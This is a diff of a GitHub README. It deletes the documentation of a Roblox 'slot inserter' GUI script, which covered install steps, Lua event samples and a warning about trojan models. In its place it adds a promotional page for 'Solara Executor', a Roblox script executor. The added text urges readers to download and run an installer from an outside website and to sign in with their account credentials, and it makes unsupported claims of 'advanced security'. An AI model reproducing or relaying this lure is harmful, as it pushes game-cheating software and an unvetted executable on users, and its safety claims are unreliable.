@@ -1,116 +1,64 @@
-# Hot slot inserter
- This is a Roblox script which allows users to insert their own slots using a GUI. \
- Shoutout to `outrun917` and `sjark` for the original GUI, scripts, and idea.
- 
- ---
- 
- ### Archival
- This script might still be useful to some people out there, which is why it's still available.\
- However this project is a bit of a dead end. I will not be making any additions to this, so long as Roblox doesn't make any changes to the engine.
+# Solara Executor
 
- [Read more here](https://gist.github.com/Hypurrnating/03f3b4401d4e67a133a4877f8644f8ed)
+![Solara Executor Logo](https://your-repository-link-here)
 
- ---
+Welcome to Solara Executor, the newest and most powerful Roblox executor in the market! Embark on an exciting journey using cutting-edge features and unleash your full potential in the world of Roblox scripting. 
 
-[![Static Badge](https://img.shields.io/badge/download_rbxm-here?style=for-the-badge&color=blue)](https://github.com/Hypurrnating/Roblox-slot-inserter/raw/main/inserter.rbxm) \
-If you wish to suggest improvements to the code, you can create a pull request and edit the .lua scripts in /src
+## Table of Contents
 
- The script creates a record of what models were insert by who and when in a lua table. It then uses that data to set a cool-down (or debounce) on each player. \
- The script also logs the insert to a discord webhook, although you should also specify a guilded webhook as fallback (will be introduced later).
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
- > [!IMPORTANT]
- > Although the script does help enhance security, it is not an alternative for manually checking the slots that are inserted.
- 
- I do aim to introduce better security features in the future, but as the warning above says, you have to be aware of what you are allowing into the game.
+## Features
 
+🔥 **Robust Script Execution**: Execute scripts flawlessly with high stability and performance, ensuring your scripts run smoothly without interruptions.
 
- ## How to install this to my game?
+🚀 **User-Friendly Interface**: Intuitive design and simple controls provide an easy-to-use experience for both beginners and advanced users.
 
- ### 1: Download the file
- Download the RBXM file using the blue button above, and drop it into the game.
+💎 **High Compatibility**: Compatible with a wide range of Roblox games, allowing you to execute scripts seamlessly across different games.
 
- ### 2: Move the objects to where they belong
- Open the explorer tab. \
- The Model Inserter itself is a screen GUI, move it to the `StarterGUI` folder in the Explorer tab. \
- After that expand the model inserter, you will find two folders: \
- One folder is called `sendToServerScriptService` and the other is called `sendToReplicatedStorage`. Now move the contents of those folders to where they belong.
+🔒 **Advanced Security**: Built-in security measures to protect your account and scripts, ensuring a safe environment for all users.
 
- ### 3: Setup webhooks
- Now you need to open the `RemoteEventScript` file, which you should have already moved to the ServerScriptService.
- When you open the file, you will notice a table called `post_urls`. Just add your webhook urls to the table.
+## Installation
 
+To get started with Solara Executor, simply follow these easy steps:
 
- ## Can I change the GUI?
- Yeah just swap it out for anything. As long as the `LocalScript` in the GUI is firing to the correct remote event, with the correct data, it doesn't matter what the GUI looks like.
+1. Visit [Solara Executor Official Website](https://solaraexec.app) or click the download button below.
+   
+   [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blue)](https://solaraexec.app)
 
- ## How to access the records/logs of everyone who inserted using the GUI?
- There is a BindableEvent in the ServerScriptService called `CallRecords`. \
- The script is connected to this event, and will return a readonly clone of the records when something fires to this event. When you fire to `CallRecord`, make sure to pass the `BindableEvent` you want the script to fire the data to.
+2. Once the download is complete, run the installer and follow the on-screen instructions to install the executor on your system.
 
-  So the flow looks a little like this: \
-  `Your script` --fires--> `CallRecords` --connects--> `inserter script` --fires--> `the bindable event you specified *with the data in payload*`
+3. Launch Solara Executor and log in with your account to start exploring the powerful features it has to offer.
 
-  Heres a sample:
-  ```lua
-    local ServerScriptService = game:GetService("ServerScriptService")
-    local CallRecords = ServerScriptService:WaitForChild("CallRecords")
-    local aCustomEvent = ServerScriptService:WaitForChild("Your Event Name")
-    
-    aCustomEvent.Event:Connect(function(records: table)
-        "... do what you want. Go crazy"
-    end)
+## Usage
 
-    CallRecords:Fire(aCustomEvent)
-  ```
+Whether you are a seasoned scripter or just starting out, Solara Executor provides a seamless experience for executing scripts in Roblox. Here's a quick guide on how to use the executor:
 
- The payload is a table with this structure:
+1. **Login**: Enter your account credentials to access the executor dashboard.
 
-  ```lua
-{
-    ["User ID"] = {
-        ["UTC Timestamp"] = "Model ID"
-    }
-}
-  ```
+2. **Select Game**: Choose the Roblox game you want to enter and execute scripts in.
 
-  The inserter script also fires `NewInsert` event (once again, in ServerScriptService) every time a model is inserted. Kinda like a webhook.
-  
-  ```lua
-    local ServerScriptService = game:GetService("ServerScriptService")
-    local NewInsert = ServerScriptService:WaitForChild("NewInsert")
+3. **Load Script**: Load your desired script into the executor interface.
 
-    NewInsert.Event:Connect(function(payload)
-        "... do what you want. Go crazy."
-    end)
-  ```
+4. **Execute**: Run the script within the selected game and observe the results in real-time.
 
-  The payload is a table with this structure:
+5. **Customization**: Explore additional features such as keybind customization and script settings to tailor your experience.
 
-  ```lua
-    {
-        ['Asset'] = (Asset that was inserted by InsertService),
-        ['Product'] = (ProductInfo from MarketplaceService),
-        ['Player'] = (The player who inserted),
-        ['utc'] = (UTC timestamp of when they inserted, kinda useless),
-    }
-  ```
+## Contributing
 
-  - ProductInfo dictionary: https://create.roblox.com/docs/reference/engine/classes/MarketplaceService#GetProductInfo
-  You might not always receive `Product` info in the `NewInsert` event.
- 
- Both these events are `BindableEvents`, so that means they will only work on server scripts. You can wrap around them if you wish to do something on local scripts.
+Contributions are welcome to enhance the functionality and features of Solara Executor. If you have any ideas, suggestions, or bug fixes, feel free to submit a pull request. Together, we can make Solara Executor even better for the entire community.
 
+Please follow these guidelines when contributing:
 
- ## Existing Issues
- It would be ideal if this script could "lock" InsertService, and act like a kernel. But it cant. \
- This means that once a asset is inserted, it can act like a trojan horse. 
- The model inserted may include a script which can give it's owner any privileges. It can provide a custom insert GUI, to bypass this one. It can provide admin tools, or straight up just ban everyone present in the game.
+- Fork the repository and create your branch for new features or bug fixes.
+- Make sure your code follows the existing style and conventions.
+- Test your changes thoroughly before submitting a pull request.
+- Provide detailed descriptions of your changes for easier review.
 
- Unfortunately, there is no way to stop this at runtime.\
- In Roblox, script content can not be read, unless by a `Studio Plugin`.\
- Scripts do not have the kind of controlling access needed on classes such as InsertService.\
- And `game.DescendantsAdded`, is the most promising, but has multiple problems:
- - How can we tell which descendant is a Model added by InsertService
- - And which descendant has been added by *this* script
-   - A simple attribute might not cut it, since those can be added by the trojan script as well
- - The exact moment at which game.DescendantsAdded is fired is unclear. I believe it to be *after* the model has finished loading. This is a problem because by that time, it could have done whatever it wanted (perhaps attaching scripts across the entire game)
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
